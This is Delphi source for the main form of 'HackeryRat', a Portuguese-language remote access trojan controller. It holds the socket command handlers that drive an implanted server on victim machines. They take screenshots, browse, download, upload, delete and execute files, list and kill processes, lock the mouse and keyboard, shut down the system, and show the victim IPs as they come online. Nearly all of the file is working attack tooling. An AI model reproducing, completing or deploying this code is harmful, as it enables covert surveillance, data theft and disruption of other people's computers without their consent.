{************************************************************
 *          HackeryRat - Criado por Nathan Nogueira        *
 *                                                          *
 * PROIBIDA A ALTERA��O OU C�PIA DO SOURCE SEM AUTORIZA��O! *
 *                                                          *
 *                 Autor: Nathan Nogueira                  *
 *             Email: nathannogueira@hotmail.com           *
 ************************************************************}
 
unit UFrmPrincipal;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, jpeg, ExtCtrls, ImgList,
  StdCtrls, ComCtrls, Menus, ScktComp, sSkinManager,
  sPanel, sLabel, Buttons, sBitBtn, sSkinProvider, acAlphaImageList, acPNG,
  sButton, sEdit, sComboBox, sGauge,
  sCheckBox, System.ImageList, System.Notification;
 type TCsStatus = (CsIdle,CsReceivingFile,CSscreen);
type
  TFrmPrincipal = class(TForm)
    SS: TServerSocket;
    PopupTrayIcon: TPopupMenu;
    MOSTRAR1: TMenuItem;
    WESCONDER1: TMenuItem;
    N1: TMenuItem;
    FECHAR1: TMenuItem;
    PopupReverso: TPopupMenu;
    FECHARSERVER1: TMenuItem;
    FECHARSERVER: TMenuItem;
    DELETARSERVER: TMenuItem;
    ImageList: TsAlphaImageList;
    CS: TClientSocket;
    sBitBtn1: TsBitBtn;
    sBitBtn8: TsBitBtn;
    sBitBtn7: TsBitBtn;
    sBitBtn6: TsBitBtn;
    sBitBtn5: TsBitBtn;
    sBitBtn4: TsBitBtn;
    sBitBtn3: TsBitBtn;
    sBitBtn2: TsBitBtn;
    Status: TStatusBar;
    sPanelExecutar: TsPanel;
    IconExecutar1: TImage;
    IconExecutar10: TImage;
    IconExecutar11: TImage;
    IconExecutar12: TImage;
    IconExecutar13: TImage;
    IconExecutar14: TImage;
    IconExecutar2: TImage;
    IconExecutar3: TImage;
    IconExecutar4: TImage;
    IconExecutar5: TImage;
    IconExecutar6: TImage;
    IconExecutar7: TImage;
    IconExecutar8: TImage;
    IconExecutar9: TImage;
    BtnExecutar: TsButton;
    RadioButtonExecutar1: TRadioButton;
    RadioButtonExecutar10: TRadioButton;
    RadioButtonExecutar11: TRadioButton;
    RadioButtonExecutar12: TRadioButton;
    RadioButtonExecutar13: TRadioButton;
    RadioButtonExecutar14: TRadioButton;
    RadioButtonExecutar2: TRadioButton;
    RadioButtonExecutar3: TRadioButton;
    RadioButtonExecutar4: TRadioButton;
    RadioButtonExecutar5: TRadioButton;
    RadioButtonExecutar6: TRadioButton;
    RadioButtonExecutar7: TRadioButton;
    RadioButtonExecutar8: TRadioButton;
    RadioButtonExecutar9: TRadioButton;
    sPanelCapturarTela: TsPanel;
    Panel1: TPanel;
    ImgCapturarTela: TImage;
    Panel2: TPanel;
    BtnCapturarTela: TsButton;
    sPanelFileManager: TsPanel;
    BtnAcima: TsButton;
    BtnDeletar: TsButton;
    BtnDownload: TsButton;
    BtnDrives: TsButton;
    BtnExecutarFM: TsButton;
    BtnRenomear: TsButton;
    BtnUpload: TsButton;
    ComboBoxFileManager: TsComboBox;
    ListViewFileManager: TListView;
    PBar: TProgressBar;
    ListBoxArquivos: TListBox;
    sPanelProcessos: TsPanel;
    BtnFecharProcessos: TsButton;
    ListBoxProcessos: TListBox;
    BtnListarProcessos: TsButton;
    sPanelSite: TsPanel;
    GroupBoxSite: TGroupBox;
    EdtSite: TEdit;
    BtnSite: TsButton;
    sPanelDiscoLocal: TsPanel;
    GroupBoxDiscoLocal: TGroupBox;
    EdtNomeDiscoLocal: TEdit;
    BtnNomeDiscoLocal: TsButton;
    sPanelDiversos: TsPanel;
    GroupBoxBandejaRelogio: TGroupBox;
    BtnOcultarBandeja: TsButton;
    BtnMostrarBandeja: TsButton;
    GroupBoxBarraTarefas: TGroupBox;
    BtnMostrarBarra: TsButton;
    BtnOcultarBarra: TsButton;
    GroupBoxBotaoIniciar: TGroupBox;
    BtnOcultarIniciar: TsButton;
    BtnMostrarIniciar: TsButton;
    GroupBoxBotaoIniciar2: TGroupBox;
    BtnDesativarIniciar: TsButton;
    BtnAtivarIniciar: TsButton;
    GroupBoxBotoesMouse: TGroupBox;
    BtnInverterMouse: TsButton;
    BtnDesinverterMouse: TsButton;
    GroupBoxDesligarReiniciarLogoff: TGroupBox;
    BtnDesligar: TsButton;
    BtnReiniciar: TsButton;
    BtnLogoff: TsButton;
    GroupBoxDriveCD: TGroupBox;
    BtnAbrirCD: TsButton;
    BtnFecharCD: TsButton;
    GroupBoxIconesDesktop: TGroupBox;
    BtnOcultarIcones: TsButton;
    BtnMostrarIcones: TsButton;
    GroupBoxMouseTeclado: TGroupBox;
    BtnTravarMouseTeclado: TsButton;
    BtnDestravarMouseTeclado: TsButton;
    GroupBoxRelogio: TGroupBox;
    BtnOcultarRelogio: TsButton;
    BtnMostrarRelogio: TsButton;
    GroupBoxVirarTela: TGroupBox;
    BtnVirarTela: TsButton;
    sPanelMensagem: TsPanel;
    IconMsg3: TImage;
    IconMsg2: TImage;
    IconMsg1: TImage;
    IconMsg4: TImage;
    EdtMsg: TsEdit;
    RadioButtonMsg1: TRadioButton;
    BtnMsg: TsButton;
    RadioButtonMsg3: TRadioButton;
    RadioButtonMsg2: TRadioButton;
    RadioButtonMsg4: TRadioButton;
    ImageList2: TImageList;
    Opn: TOpenDialog;
    Save: TSaveDialog;
    sSkinManager1: TsSkinManager;
    sSkinProvider1: TsSkinProvider;
    Edit1: TEdit;
    sPanelPapelParede: TsPanel;
    GroupBox1: TGroupBox;
    EdtPapelParede: TEdit;
    sBtnPapelParede: TsButton;
    sBitBtn9: TsBitBtn;
    sPanelTocarMusica: TsPanel;
    GroupBox2: TGroupBox;
    EdtTocarMusica: TEdit;
    sBtnTocar: TsBitBtn;
    sBtnPausar: TsBitBtn;
    sBtnParar: TsBitBtn;
    NumeroIP: TsEdit;
    sBitBtn10: TsBitBtn;
    SCBAR: TProgressBar;
    LV: TListView;
    INFORMAES1: TMenuItem;
    SISTEMA1: TMenuItem;
    REGISTRADOPARA1: TMenuItem;
    USURIODOSISTEMA1: TMenuItem;
    NOMEDOPC1: TMenuItem;
    EMPOLIGADO1: TMenuItem;
    MEMRIA1: TMenuItem;
    PROCESSADOR1: TMenuItem;
    sPanel2: TsPanel;
    sCheckBox1: TsCheckBox;
    BtnConectar: TsBitBtn;
    BtnCriarServidor: TsBitBtn;
    sPanel1: TsPanel;
    sPanelTopo1: TsPanel;
    sPanel3: TsPanel;
    NotificationCenter1: TNotificationCenter;
    TrayIcon1: TTrayIcon;
    procedure FormCreate(Sender: TObject);
  procedure Refresh_me;
    procedure Trataerros(Sender: TObject; E:Exception);
    procedure LVInsert(Sender: TObject; Item: TListItem);
    procedure DELETARSERVERClick(Sender: TObject);
    procedure FECHARSERVERClick(Sender: TObject);
    procedure MOSTRAR1Click(Sender: TObject);
    procedure WESCONDER1Click(Sender: TObject);
    procedure FECHAR1Click(Sender: TObject);
    procedure SSClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure SSClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure SSClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure SSClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure sBitBtn1Click(Sender: TObject);
    procedure sBitBtn2Click(Sender: TObject);
    procedure sBitBtn3Click(Sender: TObject);
    procedure sBitBtn4Click(Sender: TObject);
    procedure sBitBtn5Click(Sender: TObject);
    procedure sBitBtn6Click(Sender: TObject);
    procedure sBitBtn7Click(Sender: TObject);
    procedure sBitBtn8Click(Sender: TObject);
    procedure BtnMsgClick(Sender: TObject);
    procedure CSRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure BtnExecutarClick(Sender: TObject);
    procedure BtnListarProcessosClick(Sender: TObject);
    procedure BtnFecharProcessosClick(Sender: TObject);
    procedure BtnSiteClick(Sender: TObject);
    procedure BtnNomeDiscoLocalClick(Sender: TObject);
    procedure BtnTravarMouseTecladoClick(Sender: TObject);
    procedure BtnDestravarMouseTecladoClick(Sender: TObject);
    procedure BtnAbrirCDClick(Sender: TObject);
    procedure BtnFecharCDClick(Sender: TObject);
    procedure BtnOcultarIniciarClick(Sender: TObject);
    procedure BtnMostrarIniciarClick(Sender: TObject);
    procedure BtnVirarTelaClick(Sender: TObject);
    procedure BtnInverterMouseClick(Sender: TObject);
    procedure BtnDesinverterMouseClick(Sender: TObject);
    procedure BtnMostrarBarraClick(Sender: TObject);
    procedure BtnOcultarBarraClick(Sender: TObject);
    procedure BtnOcultarBandejaClick(Sender: TObject);
    procedure BtnMostrarBandejaClick(Sender: TObject);
    procedure BtnDesligarClick(Sender: TObject);
    procedure BtnReiniciarClick(Sender: TObject);
    procedure BtnLogoffClick(Sender: TObject);
    procedure BtnOcultarRelogioClick(Sender: TObject);
    procedure BtnMostrarRelogioClick(Sender: TObject);
    procedure BtnDesativarIniciarClick(Sender: TObject);
    procedure BtnAtivarIniciarClick(Sender: TObject);
    procedure BtnOcultarIconesClick(Sender: TObject);
    procedure BtnMostrarIconesClick(Sender: TObject);
    procedure sPanelFileManagerEnter(Sender: TObject);
    procedure CSConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CSConnecting(Sender: TObject; Socket: TCustomWinSocket);
    procedure CSDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure ComboBoxFileManagerChange(Sender: TObject);
    procedure ListViewFileManagerDblClick(Sender: TObject);
    procedure ListViewFileManagerMouseDown(Sender: TObject;
      Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
    procedure BtnDrivesClick(Sender: TObject);
    procedure BtnUploadClick(Sender: TObject);
    procedure BtnDownloadClick(Sender: TObject);
    procedure BtnAcimaClick(Sender: TObject);
    procedure BtnDeletarClick(Sender: TObject);
    procedure BtnExecutarFMClick(Sender: TObject);
    procedure BtnRenomearClick(Sender: TObject);
    procedure BtnCapturarTelaClick(Sender: TObject);
    procedure ImgCapturarTelaDblClick(Sender: TObject);
    procedure ListBoxArquivosClick(Sender: TObject);
    procedure BtnConectarClick(Sender: TObject);
    procedure sBtnPapelParedeClick(Sender: TObject);
    procedure sBitBtn9Click(Sender: TObject);
    procedure sBtnTocarClick(Sender: TObject);
    procedure sBtnPausarClick(Sender: TObject);
    procedure sBtnPararClick(Sender: TObject);
    procedure sBitBtn10Click(Sender: TObject);
    procedure BtnCriarServidorClick(Sender: TObject);
    procedure INFORMAES1Click(Sender: TObject);
    procedure USURIODOSISTEMA1Click(Sender: TObject);
    procedure NOMEDOPC1Click(Sender: TObject);
    procedure SISTEMA1Click(Sender: TObject);
    procedure REGISTRADOPARA1Click(Sender: TObject);
    procedure EMPOLIGADO1Click(Sender: TObject);
    procedure MEMRIA1Click(Sender: TObject);
    procedure PROCESSADOR1Click(Sender: TObject);
    procedure LVDblClick(Sender: TObject);
    procedure sCheckBox1Click(Sender: TObject);
    procedure TrayIcon1DblClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmPrincipal: TFrmPrincipal;
  SizeOfFile:integer;
  CsState:TCsStatus;
  fs:TFileStream;
  CurrentDir:String;
   RemoteFile,SaveLocalAs : string;
   Directory:String;

implementation

uses Math, UCriarServidor;

{$R *.dfm}

function ShellExecuteA(hWnd: LongWord; Operation, FileName, Parameters, Directory: PAnsiChar; ShowCmd: Integer): HINST; stdcall; external 'shell32.dll';

procedure TFrmPrincipal.FormCreate(Sender: TObject);
begin
 CsState:=CsIdle;
 Application.OnException:=TrataErros;
 FrmPrincipal.Left := (Screen.Width  div 2) - ( FrmPrincipal.Width div 2);
 FrmPrincipal.Top := (Screen.Height div 2) - ( FrmPrincipal.Height div 2);
 sPanelMensagem.BringToFront;
 Trayicon1.Hint:= 'HACKERYRAT'+#13+'CRIADO POR: NATHAN NOGUEIRA';
 end;

procedure TFrmPrincipal.Trataerros(Sender: TObject; E:Exception);
begin
   If Pos(UpperCase('10061'),UpperCase(E.Message)) <> 0 then
     Status.Panels[0].Text:= ('O PC EST� SEM O SERVIDOR!');

   If Pos(UpperCase('10049'),UpperCase(E.Message)) <> 0 then
     Status.Panels[0].Text:= ('SEM CONEX�O COM O PC!');

   If Pos(UpperCase('11004'),UpperCase(E.Message)) <> 0 then
     Status.Panels[0].Text:= ('SEM CONEX�O COM O PC!');

   If Pos(UpperCase('10065'),UpperCase(E.Message)) <> 0 then
     Status.Panels[0].Text:= ('O PC EST� SEM O SERVIDOR!');
end;

procedure TFrmPrincipal.TrayIcon1DblClick(Sender: TObject);
begin
if FrmPrincipal.Visible=true then
FrmPrincipal.Visible:= false
else
FrmPrincipal.Visible:= true;
end;

procedure TFrmPrincipal.LVInsert(Sender: TObject; Item: TListItem);
begin
 sPanelTopo1.Caption:= ' USU�RIOS ONLINE : ' + IntToStr(LV.Items.Count);
end;

procedure TFrmPrincipal.DELETARSERVERClick(Sender: TObject);
begin
  If not assigned(lv.Selected) then exit;
  if Application.MessageBox('DESEJA REALMENTE DELETAR O SERVIDOR?','Confirma��o', MB_YESNO + MB_ICONQUESTION) = IDYES then
  ss.Socket.Connections[0].SendText('<DELSERVER>');
end;

procedure TFrmPrincipal.FECHARSERVERClick(Sender: TObject);
begin
  If not assigned(lv.Selected) then exit;
  ss.Socket.Connections[0].SendText('<EXITSERVER>');
end;

procedure TFrmPrincipal.MOSTRAR1Click(Sender: TObject);
begin
FrmPrincipal.Show;
FrmPrincipal.BringToFront;
end;


procedure TFrmPrincipal.WESCONDER1Click(Sender: TObject);
begin
FrmPrincipal.Hide;
end;

procedure TFrmPrincipal.FECHAR1Click(Sender: TObject);
begin
Application.Terminate;
end;

procedure TFrmPrincipal.SSClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
Var
 l : Tlistitem;
 MyNotification: TNotification;
begin
 L := FrmPrincipal.LV.Items.Add;
 l.Caption := Socket.RemoteAddress;
 MyNotification := NotificationCenter1.CreateNotification;
 try
    MyNotification.Name := 'HackeryRat';
    MyNotification.Title := 'HackeryRat';
    MyNotification.AlertBody := 'O IP ' + Socket.RemoteAddress + ' EST� ONLINE';

    NotificationCenter1.PresentNotification(MyNotification);
  finally
    MyNotification.Free;
 end;
 end;

procedure TFrmPrincipal.SSClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
Var
 L : Tlistitem;
 MyNotification: TNotification;
begin
 L := FrmPrincipal.LV.FindCaption( 0, Socket.RemoteAddress,false,true,false );
 if L <> nil then L.Delete;
 sPanelTopo1.Caption:= ' USU�RIOS ONLINE : ' + IntToStr(FrmPrincipal.LV.Items.Count);
 //MSNPopUp1.Text:= 'O IP ' + Socket.RemoteAddress + ' EST� OFFLINE';
 //MSNPopUp1.ShowPopUp;
end;

procedure TFrmPrincipal.SSClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
Var
 L : Tlistitem;
begin
 L := FrmPrincipal.LV.FindCaption( 0, Socket.RemoteAddress,false,true,false );
 if L <> nil then L.Delete;
 sPanelTopo1.Caption:= ' USU�RIOS ONLINE : ' + IntToStr(FrmPrincipal.LV.Items.Count);
 //MSNPopUp1.Text:='O IP ' + Socket.RemoteAddress + ' EST� OFFLINE';
 //MSNPopUp1.ShowPopUp;
end;

procedure TFrmPrincipal.SSClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
  var
  Buf : string;
  MsgLen,
  LenReceive : Integer;
  begin
  MsgLen:=Socket.ReceiveLength;
  SetLength(buf,MsgLen);
  LenReceive:=socket.ReceiveBuf(buf[1],MsgLen);
  buf:=copy(buf,1,LenReceive);

if pos('<STATUS>',Buf) = 1 then
begin
delete(buf,1,8);
showMessage(UpperCase(Buf));
end;
END;

procedure TFrmPrincipal.sBitBtn1Click(Sender: TObject);
begin
sPanelMensagem.BringToFront;
end;

procedure TFrmPrincipal.sBitBtn2Click(Sender: TObject);
begin
sPanelExecutar.BringToFront;
end;

procedure TFrmPrincipal.sBitBtn3Click(Sender: TObject);
begin
sPanelCapturarTela.BringToFront;
end;

procedure TFrmPrincipal.sBitBtn4Click(Sender: TObject);
begin
sPanelFileManager.BringToFront;
end;

procedure TFrmPrincipal.sBitBtn5Click(Sender: TObject);
begin
sPanelProcessos.BringToFront;
end;

procedure TFrmPrincipal.sBitBtn6Click(Sender: TObject);
begin
sPanelSite.BringToFront;
end;

procedure TFrmPrincipal.sBitBtn7Click(Sender: TObject);
begin
sPanelDiscoLocal.BringToFront;
end;

procedure TFrmPrincipal.sBitBtn8Click(Sender: TObject);
begin
sPanelDiversos.BringToFront;
end;

procedure TFrmPrincipal.BtnMsgClick(Sender: TObject);
begin
 if RadioButtonMsg1.Checked then
begin
CS.Socket.SendText('<MSG1>'+ EdtMsg.Text);
end;
if RadioButtonMsg2.Checked then
begin
CS.Socket.SendText('<MSG2>'+ EdtMsg.Text);
end;
if RadioButtonMsg3.Checked then
begin
CS.Socket.SendText('<MSG3>'+ EdtMsg.Text);
end;
if RadioButtonMsg4.Checked then
begin
CS.Socket.SendText('<MSG4>'+ EdtMsg.Text);
end;
end;

procedure TFrmPrincipal.CSRead(Sender: TObject; Socket: TCustomWinSocket);
 var
  Buf : string;
  MsgLen,
  LenReceive : Integer;
  ProcCount, i:Integer;
  ProcName: String;
  FileCount, DirCount, DriverCount:Integer;
  DirName, FileName, DriverName:String;

  begin
  MsgLen:=Socket.ReceiveLength;
  SetLength(buf,MsgLen);
  LenReceive:=socket.ReceiveBuf(buf[1],MsgLen);
  buf:=copy(buf,1,LenReceive);

  //LISTAR PROCESSOS
if pos('<LISTPROC>',buf) = 1 then
begin
ListBoxProcessos.Items.Clear;
delete(buf,1,10);
ProcCount:=StrToInt(copy(buf,1,pos('|',buf)-1));
delete(buf,1,pos('|',buf));
For i:=0 to ProcCount-1 do begin
ProcName:=copy(buf,1,pos('|',buf)-1);
ListBoxProcessos.Items.Add(ProcName);
delete(buf,1,pos('|',buf));
end;
end;

 //STATUS
if pos('<RESULT>',Buf) = 1 then
begin
delete(buf,1,8);
Status.Panels[1].Text:=UpperCase(Buf);
end;

if pos('<LISTOFFILES>',buf)=1 then
  begin

  delete(buf,1,25);
  DirCount:=StrToInt(copy(buf,1,pos('|',buf)-1));
  delete(buf,1,pos('|',buf));
   ListViewFileManager.Clear;
   ListBoxArquivos.Items.Clear;
  for I:=1 to DirCount do begin
  DirName:=Copy(buf,1,pos('|',buf)-1);
  delete(buf,1,pos('|',buf));
   if (DirName <> '.') and (DirName <> '..') then

  ListViewFileManager.AddItem(DirName,pointer(self));
  ListViewFileManager.Update;
  end;
   delete(buf,1,pos(':',buf));
   FileCount:=strtoint(copy(buf,1,pos('|',buf)-1));
    delete(buf,1,pos('|',buf));

    for i :=1 to FileCount do begin
    ListBoxArquivos.Update;
    FileName:=copy(buf,1,pos('|',buf)-1);
    delete(buf,1,pos('|',buf));
    ListBoxArquivos.Items.Add(FileName);
    
    end;

  end;
  if pos('<DRIVERLIST>',buf) = 1 then
  begin
  ComboBoxFileManager.Clear;
  delete(buf,1,20);
  DriverCount:=StrToInt(copy(buf,1,pos('|',buf)-1));
  delete(buf,1,pos('|',buf));
  for i:=1 to DriverCount do begin
  DriverName:=copy(buf,1,pos('|',buf)-1);
  delete(buf,1,pos('|',buf));
  ComboBoxFileManager.Items.Add(DriverName);
  end;
  end;
  if pos('<FILEONWAY>',buf) = 1 then
  begin

  SizeOfFile:=StrToInt(copy(buf,12,pos('|',buf)-12));
  delete(buf,1,pos('|',buf));
  CsState:=CsReceivingFile;
  fs:=TFileStream.Create(SaveLocalAs,fmCreate or fmOpenWrite);
  if SaveLocalAs ='screenShot.jpg'then SCBar.Max :=SizeOfFile
  else
   PBar.Max:=SizeOfFile;
  end;
  case CsState of
  CsReceivingFile:begin
  fs.Write(buf[1],length(buf));
  dec(SizeOfFile,length(buf));
  if SaveLocalAs = 'screenShot.jpg' then SCBar.Position := SCBar.Position +length(buf)
  else PBar.StepBy(length(buf));

  if SizeOfFile = 0 then begin
  CsState:=CsIdle;
  buf:='';
  fs.Free;
  Status.Panels[1].Text:= 'DOWNLOAD DO ARQUIVO CONCLU�DO';
  PBar.Position:=0;
    if SaveLocalAs = 'screenShot.jpg' then begin
    ImgCapturarTela.Picture.LoadFromFile('screenshot.jpg');
     SCBar.Position:=0;
  end;
end;
end;
end;
end;

procedure TFrmPrincipal.BtnExecutarClick(Sender: TObject);
begin
 if RadioButtonExecutar1.Checked then
begin
 CS.Socket.SendText('<CALCULADORA>');
end;

 if RadioButtonExecutar2.Checked then
begin
CS.Socket.SendText('<MSN>');
end;

 if RadioButtonExecutar3.Checked then
begin
CS.Socket.SendText('<IEXPLORER>');
end;

 if RadioButtonExecutar4.Checked then
begin
CS.Socket.SendText('<PAINT>');
end;

 if RadioButtonExecutar5.Checked then
begin
CS.Socket.SendText('<WORDPAD>');
end;

 if RadioButtonExecutar6.Checked then
begin
CS.Socket.SendText('<WINRAR>');
end;

 if RadioButtonExecutar7.Checked then
begin
CS.Socket.SendText('<MSDOS>');
end;

 if RadioButtonExecutar8.Checked then
begin
CS.Socket.SendText('<WMP>');
end;

 if RadioButtonExecutar9.Checked then
begin
CS.Socket.SendText('<VIRTUAL>');
end;

 if RadioButtonExecutar10.Checked then
begin
CS.Socket.SendText('<GRAVADOR>');
end;

 if RadioButtonExecutar11.Checked then
begin
CS.Socket.SendText('<VOLUME>');
end;

 if RadioButtonExecutar12.Checked then
begin
CS.Socket.SendText('<MAPA>');
end;

 if RadioButtonExecutar13.Checked then
begin
CS.Socket.SendText('<RESTORE>');
end;

 if RadioButtonExecutar14.Checked then
begin
CS.Socket.SendText('<EXPLORER>');
end;

end;

procedure TFrmPrincipal.BtnListarProcessosClick(Sender: TObject);
begin
CS.Socket.SendText('<LISTPROCE>');
end;

procedure TFrmPrincipal.BtnFecharProcessosClick(Sender: TObject);
begin
CS.Socket.SendText('<KILLPROC>'+ListBoxProcessos.Items[ListBoxProcessos.itemindex]);
Status.Panels[1].Text:=('FECHANDO PROCESSO ' +ListBoxProcessos.Items[ListBoxProcessos.itemindex]);
end;

procedure TFrmPrincipal.BtnSiteClick(Sender: TObject);
begin
If EdtSite.Text = '' then exit;
CS.Socket.SendText('<SITE>'+ EdtSite.Text);
end;

procedure TFrmPrincipal.BtnNomeDiscoLocalClick(Sender: TObject);
begin
CS.Socket.SendText('<NOMEDISCO>'+ EdtNomeDiscoLocal.Text);
end;

procedure TFrmPrincipal.BtnTravarMouseTecladoClick(Sender: TObject);
begin
CS.Socket.SendText('<TRAVARMOUSETECLADO>');
end;

procedure TFrmPrincipal.BtnDestravarMouseTecladoClick(Sender: TObject);
begin
CS.Socket.SendText('<DESTRAVARMOUSETECLADO>');
end;

procedure TFrmPrincipal.BtnAbrirCDClick(Sender: TObject);
begin
CS.Socket.SendText('<OPENCD>'+'set cdaudio door open wait');
end;

procedure TFrmPrincipal.BtnFecharCDClick(Sender: TObject);
begin
CS.Socket.SendText('<CLOSECD>'+'set cdaudio door closed wait');
end;

procedure TFrmPrincipal.BtnOcultarIniciarClick(Sender: TObject);
begin
CS.Socket.SendText('<HIDESTARTBTN>');
end;

procedure TFrmPrincipal.BtnMostrarIniciarClick(Sender: TObject);
begin
CS.Socket.SendText('<SHOWSTARTBTN>');
end;

procedure TFrmPrincipal.BtnVirarTelaClick(Sender: TObject);
begin
CS.Socket.SendText('<FILPSCREEN>');
end;

procedure TFrmPrincipal.BtnInverterMouseClick(Sender: TObject);
begin
CS.Socket.SendText('<INVERTERMOUSE>');
end;

procedure TFrmPrincipal.BtnDesinverterMouseClick(Sender: TObject);
begin
CS.Socket.SendText('<DESINVERTERMOUSE>');
end;

procedure TFrmPrincipal.BtnMostrarBarraClick(Sender: TObject);
begin
CS.Socket.SendText('<HIDETASKBAR>');
end;

procedure TFrmPrincipal.BtnOcultarBarraClick(Sender: TObject);
begin
CS.Socket.SendText('<SHOWTASKBAR>');
end;

procedure TFrmPrincipal.BtnOcultarBandejaClick(Sender: TObject);
begin
CS.Socket.SendText('<HIDETRY>');
end;

procedure TFrmPrincipal.BtnMostrarBandejaClick(Sender: TObject);
begin
CS.Socket.SendText('<SHOWTRY>');
end;

procedure TFrmPrincipal.BtnDesligarClick(Sender: TObject);
begin
CS.Socket.SendText('<SHUTDWN>');
end;

procedure TFrmPrincipal.BtnReiniciarClick(Sender: TObject);
begin
CS.Socket.SendText('<RESTART>');
end;

procedure TFrmPrincipal.BtnLogoffClick(Sender: TObject);
begin
CS.Socket.SendText('<LOGOFF>');
end;

procedure TFrmPrincipal.BtnOcultarRelogioClick(Sender: TObject);
begin
CS.Socket.SendText('<HIDECLOCK>');
end;

procedure TFrmPrincipal.BtnMostrarRelogioClick(Sender: TObject);
begin
CS.Socket.SendText('<SHOWCLOCK>');
end;

procedure TFrmPrincipal.BtnDesativarIniciarClick(Sender: TObject);
begin
CS.Socket.SendText('<DESATIVARINICIAR>');
end;

procedure TFrmPrincipal.BtnAtivarIniciarClick(Sender: TObject);
begin
CS.Socket.SendText('<ATIVARINICIAR>');
end;

procedure TFrmPrincipal.BtnOcultarIconesClick(Sender: TObject);
begin
CS.Socket.SendText('<HIDEICON>');
end;

procedure TFrmPrincipal.BtnMostrarIconesClick(Sender: TObject);
begin
CS.Socket.SendText('<SHOWICON>');
end;

procedure TFrmPrincipal.sPanelFileManagerEnter(Sender: TObject);
begin
if CS.Socket.Connected = True then begin
CS.Socket.SendText('<GETDRIVERS>');
ComboBoxFileManager.Items.Add('N�o Conectado');
end;
end;
procedure TFrmPrincipal.CSConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
Status.Panels[0].Text:= ('CONECTADO � ' + Socket.RemoteAddress);
  BtnConectar.Caption:= 'Desconectar';
  BtnConectar.ImageIndex:= 2;
end;

procedure TFrmPrincipal.CSConnecting(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 Status.Panels[0].Text:= ('CONECTANDO...');
end;

procedure TFrmPrincipal.CSDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
Status.Panels[0].Text:= ('DESCONECTADO');
 BtnConectar.Caption:= 'Conectar';
 BtnConectar.ImageIndex:= 1;
end;

procedure TFrmPrincipal.FormClose(Sender: TObject; var Action: TCloseAction);
begin
Application.Terminate;
end;

procedure TFrmPrincipal.Refresh_me;
begin
sleep(1000);
CS.Socket.SendText('<GETFILES>'+CurrentDir);
end;

procedure TFrmPrincipal.ComboBoxFileManagerChange(Sender: TObject);
begin
CurrentDir:=copy(ComboBoxFileManager.Text,1,3);
if CS.Active = true then
begin
CS.Socket.SendText('<GETFILES>'+CurrentDir);
end;
end;

procedure TFrmPrincipal.ListViewFileManagerDblClick(Sender: TObject);
begin
if CS.Active = active then
begin
CurrentDir:=CurrentDir+ListViewFileManager.Selected.Caption+'\';
CS.Socket.SendText('<GETFILES>'+CurrentDir);
end;
end;

procedure TFrmPrincipal.ListViewFileManagerMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
if Button = mbLeft then
begin

Directory:=CurrentDir + ListViewFileManager.Selected.Caption;
end;
end;

procedure TFrmPrincipal.BtnDrivesClick(Sender: TObject);
begin
if CS.Active = true then
begin
CS.Socket.SendText('<GETDRIVERS>');
Status.Panels[1].Text:='LISTANDO DRIVES... ';
end;
end;

procedure TFrmPrincipal.BtnUploadClick(Sender: TObject);
var
UFS : TFileStream;
ToUpload,UploadtoFIle : String;
SIzeofFile2 : integer;
begin
if CS.Active = true then
begin
if Not opn.Execute then  Exit ; begin
 ToUpload:=opn.FileName;
 UploadtoFIle:=CurrentDir+InputBox('Upload do arquivo','Nome do Arquivo',ExtractFileName(opn.FileName));
 ufs:=TFileStream.Create(ToUpload,fmopenread);
 try
 begin
 //ufs:=TFileStream.Create(ToUpload,fmopenread);
 ufs.Position :=0;
 SIzeofFile2 :=ufs.Size;
 CS.Socket.SendText('<UPLOAD>'+IntToStr(SIzeofFile2)+'|'+UploadtoFIle+'|');
 CS.Socket.SendStream(ufs);
 end;
 except Status.Panels[1].Text:='N�O FOI POSS�VEL ENVIAR O ARQUIVO...';
 UFS.Free;
 end;
end;
end;
 end;

procedure TFrmPrincipal.BtnDownloadClick(Sender: TObject);
begin
if (CS.Active = true) and
(ListBoxArquivos.Items.Text <> '')
 then
begin
RemoteFile:=CurrentDir+ListBoxArquivos.Items[ListBoxArquivos.itemindex];
save.FileName:= ListBoxArquivos.Items[ListBoxArquivos.itemindex];
if Not  save.Execute then Exit;
begin
SaveLocalAs:=save.FileName;
  end;
  CS.Socket.SendText('<GETFILE>'+RemoteFile);
 end;
 end;

procedure TFrmPrincipal.BtnAcimaClick(Sender: TObject);
begin
if CS.Active = true then begin
if Length(CurrentDir)>3 then begin
Delete(CurrentDir,length(CurrentDir),1);
Delete(CurrentDir,LastDelimiter('\',CurrentDir)+1,length(CurrentDir)-LastDelimiter('\',CurrentDir)+1);
end;
CS.Socket.SendText('<GETFILES>'+CurrentDir);
end;
 end;

procedure TFrmPrincipal.BtnDeletarClick(Sender: TObject);
Var
FileToDelete : string;
begin
if CS.Active=true then begin
FileToDelete:=CurrentDir+ListBoxArquivos.Items[ListBoxArquivos.itemindex];
CS.Socket.SendText('<DELETEFILE>'+FileToDelete);
Status.Panels[1].Text:='Deletar Arquivo: '+FileToDelete;
//sleep(1000);
//FrmMain.ClientSocket1.Socket.SendText('<GETFILES>'+CurrentDir);
end;
end;

procedure TFrmPrincipal.BtnExecutarFMClick(Sender: TObject);
var fileToExecute: string;
begin
if CS.Active = true then
Begin
fileToExecute:=CurrentDir+ListBoxArquivos.Items[ListBoxArquivos.itemindex];
CS.Socket.SendText('<EXECUTE>'+fileToExecute);
end;
end;

